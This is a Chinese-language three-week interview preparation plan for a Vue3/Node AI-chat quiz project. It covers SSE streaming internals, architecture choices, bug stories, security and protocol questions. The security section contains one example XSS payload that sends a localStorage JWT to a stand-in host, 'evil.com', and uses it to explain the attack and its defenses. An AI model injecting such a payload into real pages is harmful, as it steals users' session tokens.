# 面试宝典 — 3 周项目拷打训练计划

> 版本: v1.0 | 创建: 2026-06-09  
> 目标: 用 3 周时间，逐题攻克面试官的 13 个深度追问，确保项拷打环节不翻车  
> 配合: `interview-drill` skill（交互式模拟面试）  
> 前置: 已完成全部功能开发（Week1-4），进入面试准备阶段

---

## 训练方法论

不要背答案。面试官能闻出来。正确做法：

1. **先读代码** → 理解数据流全路径
2. **对着白板画** → 从用户点击到数据返回，每一步经过什么文件/函数
3. **开口讲** → 用口语化表达，不是背文档
4. **用 drill skill 验证** → 让 AI 面试官随机抽题考你

---

## 第一周：SSE 流式输出深度攻防（最高频，权重 40%）

> 这是面试官最感兴趣的部分。如果这 6 题答不好，其他题答再好也救不回来。

### Day 1-2：Q3~Q4 — 底层 API 理解

**学习目标**: 能解释 `ReadableStream`、`TextDecoder`、`buffer.split('\n\n')` 的每一个细节

**必读文件**:
- [frontend/src/api/sse.js](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/frontend/src/api/sse.js)（46行，精读每一行）
- [MDN: ReadableStream](https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream)
- [MDN: TextDecoder](https://developer.mozilla.org/zh-CN/docs/Web/API/TextDecoder)

**练习任务**:
1. 在白板上画出 `createSSE()` 的完整调用链：fetch → reader → decoder → processBuffer → onMessage
2. 解释为什么 `{ stream: true }` 参数不能省略（用中文 UTF-8 编码举例：汉字 `你` = 3 字节 `E4 BD A0`，如果网络帧在 `E4` 后断开…）
3. 解释 `processBuffer` 里 `lines.pop()` 的作用：为什么不用 `lines[lines.length-1]`？pop 修改了原数组会怎样？

**面试官原题**:
- Q3: ReadableStream 的 getReader() 读到的 value 是什么类型？为什么用 TextDecoder？
- Q4: buffer.split('\n\n') 然后 lines.pop() 是干什么的？

### Day 3-4：Q5~Q6 — 前后端联动 + 边界处理

**学习目标**: 理解 AbortController 如何贯穿前后端，以及输出截断的考量

**必读文件**:
- [frontend/src/composables/useAiChat.js](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/frontend/src/composables/useAiChat.js)（147行，重点看 `abortCurrent()`、`stop()`、`onUnmounted`）
- [backend/controllers/aiController.js](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/backend/controllers/aiController.js)（149行，重点看 `handleStreamResponse`）

**练习任务**:
1. 画出"用户点停止生成"的完整链路：按钮点击 → stop() → abortCurrent() → controller.abort() → fetch AbortError → 后端 apiRes.destroy()
2. 解释 `MAX_OUTPUT_CHARS = 16000` 的来源：DeepSeek 单次最大约 8K tokens，1 token ≈ 2-3 个中文字符，16000 ≈ 安全上限
3. 如果去掉后端截断，会发生什么？（前端 localStorage 被撑爆、messages 数组过大、token 裁剪逻辑被绕过）

**面试官原题**:
- Q5: 点了停止，后端到 DeepSeek 的连接关了吗？怎么关的？
- Q6: MAX_OUTPUT_CHARS 为什么是 16000？

### Day 5：Q1~Q2 — 项目全局 + 白板画图

**学习目标**: 能在一分钟内说清项目全貌，能在白板上画出完整数据流

**练习任务**:
1. 自己对着镜子讲一遍 1 分钟自我介绍（执行手册 §6.1 有模板，但要用你自己的话说）
2. 在白板上从 `用户输入 → AiChat.vue → useAiChat → api/ai.js → api/sse.js → fetch → 后端路由 → aiController → DeepSeek → 逐chunk返回` 完整的画一遍，每个节点标注文件名和函数名
3. 计时：60 秒内画完 + 讲完

**面试官原题**:
- Q1: 三句话说清楚项目
- Q2: 白板画出完整数据流

### Day 6-7：复习 + drill skill 模拟

用 `interview-drill` skill，选"SSE 专题"模式，让 AI 面试官随机抽题拷打你。答错的回看对应 Day 的内容。

---

## 第二周：架构设计 + 踩坑故事（权重 30%）

### Day 8-9：Q7~Q8 — 架构设计决策

**学习目标**: 能清晰解释为什么要分层，以及 JSON 文件存储的权衡

**必读文件**:
- [.trae/rules/01-architecture-contract.md](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/.trae/rules/01-architecture-contract.md)
- [.trae/rules/03-anti-patterns.md](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/.trae/rules/03-anti-patterns.md)
- [backend/data/index.js](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/backend/data/index.js)（JSON 读写工具）

**练习任务**:
1. 用一句话解释分层的好处：把 fetch 放在 vue 和放在 composable 里，改需求时有什么区别？
2. JSON 文件并发写冲突：画一个时序图说明两个请求同时写 records.json 时数据可能丢失
3. 准备一个"有数据库的场景下你会怎么改进"的回答

**面试官原题**:
- Q7: 为什么 vue 不能直接调 fetch？谁逼你绕这么远？
- Q8: 两个用户同时写 records.json 会怎样？

### Day 10-11：Q9 — 技术选型答辩

**学习目标**: 能对每个技术选型给出"这个方案最适合我的场景"的逻辑分析

**必读文件**:
- 执行手册 §一（技术栈精简版 + 为什么选）
- 执行手册 §二（为什么用 JSON 文件不用数据库）

**练习任务**:
1. 准备一句话解释：为什么不用 TS、为什么不用 MongoDB、为什么不用 WebSocket
2. 重点练习"不用 TS"的回答——这是最容易被挑战的。不要只说"省时间"，要说清楚在什么条件下会换 TS
3. 每个选型都要准备"什么情况下我会换"的后半句

**面试官原题**:
- Q9: 为什么选 Vue3 不用 TS？给我一个面试官能接受的理由

### Day 12-13：Q10~Q11 — 踩坑故事打磨

**学习目标**: 讲出 2-3 个真实、有细节、有调试过程的踩坑故事

**必读文件**:
- 执行手册 §七（常见坑位预警，共 24 个坑）
- [backend/controllers/aiParser.js](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/backend/controllers/aiParser.js)（看 reasoning_content 过滤）

**练习任务 - 打造你的"招牌故事"**:

挑 2 个坑写成完整故事，每个故事包含：
1. **现象**: 用户看到了什么 bug
2. **定位**: 你怎么找到原因的（具体用了什么调试手段）
3. **根因**: bug 的本质原因是什么
4. **修复**: 怎么改的
5. **反思**: 如果重来一次怎么避免

推荐讲的故事：
- SSE 中文乱码 → TextDecoder `{stream:true}`（展示你对编码层面的理解）
- V4 reasoning_content 混入（展示你适配新 API 版本的能力）
- 快速点击导致多个回答同时出现（展示你对竞态条件的意识）

**面试官原题**:
- Q10: 遇到最大的 bug？怎么定位的？
- Q11: V4 reasoning_content 是什么？不过滤会怎样？

### Day 14：复习 + drill skill 模拟

用 `interview-drill` skill，选"架构 + 踩坑"专题模式。

---

## 第三周：综合 + 延伸（权重 30%）

### Day 15-16：Q12 — 安全意识

**学习目标**: 能识别常见 Web 安全问题，给出防御方案

**必读文件**:
- [frontend/src/api/request.js](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/frontend/src/api/request.js)（看 JWT 拦截器）
- [backend/middleware/auth.js](file:///d:/BaiduNetdiskDownload/A055/sql/trae/shu-ju/webtest/interview-handbook/backend/middleware/auth.js)（看 JWT 验证）

**练习任务**:
1. XSS 攻击原理：如果我在输入框输入 `<script>fetch('http://evil.com?t='+localStorage.token)</script>`，会发生什么？
2. 防御方案：httpOnly cookie（为什么现在没用？→ 演示项目求简单）、CSP 头、输入转义
3. CSRF 攻击原理：如果我在另一个网站放一个隐藏表单 POST 到你的 API…
4. 准备回答：你知道你的项目存在这些安全隐患吗？→ "知道，这是我刻意做的取舍。演示项目优先保证功能完整，生产环境会加这些防御"

**面试官原题**:
- Q12: JWT 存 localStorage，被 XSS 拿走怎么办？

### Day 17-18：Q13 — 协议层面理解

**学习目标**: 能从 HTTP 协议层面解释 SSE 和 WebSocket 的区别

**练习任务**:
1. 打开 Chrome DevTools → Network → 发一条 AI 对话 → 看 SSE 请求的 Headers
   - Content-Type: `text/event-stream`
   - Cache-Control: `no-cache`
   - Connection: `keep-alive`
2. 了解 WebSocket 的 HTTP Upgrade 握手过程
3. 准备一句话说清楚协议层区别：「SSE 从头到尾都是 HTTP，Content-Type 是 `text/event-stream`。WebSocket 先用 HTTP 握手，然后 Upgrade 升级到 WS 协议，之后就脱离 HTTP 了。」

**面试官原题**:
- Q13: SSE 和 WebSocket 在 HTTP 协议层面有什么区别？

### Day 19-20：全部 9 大模块快速回顾

**学习目标**: 确保非核心模块（JWT、答题引擎、题库、错题本等）的面试题也能答上

**复习清单**（每个模块 30 分钟）:
| 模块 | 核心问题 | 复习文件 |
|------|---------|---------|
| JWT 认证 | token 怎么签发/验证/过期处理 | request.js, auth.js |
| 路由守卫 | 未登录怎么拦截的 | router/index.js |
| 答题引擎 | 单选多选怎么处理，倒计时超时怎么提交 | useQuiz.js, useTimer.js |
| 题库系统 | 筛选搜索分页怎么做的 | useQuestionBank.js |
| 错题本 | 错题怎么存入和移除的 | useWrongBook.js |
| 统计仪表盘 | ECharts 数据怎么来的 | Dashboard.vue, recordController.js |

### Day 21：全真模拟面试

用 `interview-drill` skill，选"全真模拟"模式：AI 面试官随机从 13 题中抽 5-6 题，按真实面试节奏连续拷打，不给你看答案。答完后再逐个复盘。

---

## 13 题优先级矩阵

| 优先级 | 题号 | 主题 | 为什么 |
|--------|------|------|--------|
| 🔴 P0 | Q3, Q4 | SSE 底层 API | 你的核心亮点，答不好直接挂 |
| 🔴 P0 | Q2 | 白板画数据流 | 一句话：画不出来 = 不是你写的 |
| 🔴 P0 | Q7 | 架构分层理由 | 测试你有没有设计思维 |
| 🟡 P1 | Q5, Q6 | 前后端联动/截断 | 展示你对全链路的理解 |
| 🟡 P1 | Q10 | 最大 bug | 测试真实性和调试能力 |
| 🟡 P1 | Q9 | 技术选型 | 实习生最容易被挑战的问题 |
| 🟢 P2 | Q1 | 三句话总结 | 开场题，决定面试官第一印象 |
| 🟢 P2 | Q8 | JSON 并发 | 展示你意识到局限性的能力 |
| 🟢 P2 | Q11 | reasoning_content | V4 适配能力 |
| 🟢 P2 | Q12 | XSS 安全 | 加分项，不要求完美方案 |
| 🟢 P2 | Q13 | 协议层 | 分水岭题，答对直接高一档 |

---

## 与 interview-drill skill 配合使用

1. 每天按计划学完后，打开对话输入：`「用 interview-drill，考我今天学的内容」`
2. Drill skill 的 4 种模式：
   - `SSE 专题`：只抽 Q2~Q6 + Q11（6 题）
   - `架构 + 踩坑`：只抽 Q7~Q10（4 题）
   - `综合延伸`：只抽 Q1 + Q12 + Q13（3 题）
   - `全真模拟`：13 题随机抽 5-6 题，连续拷打
3. 答错的题标记下来，第二天重考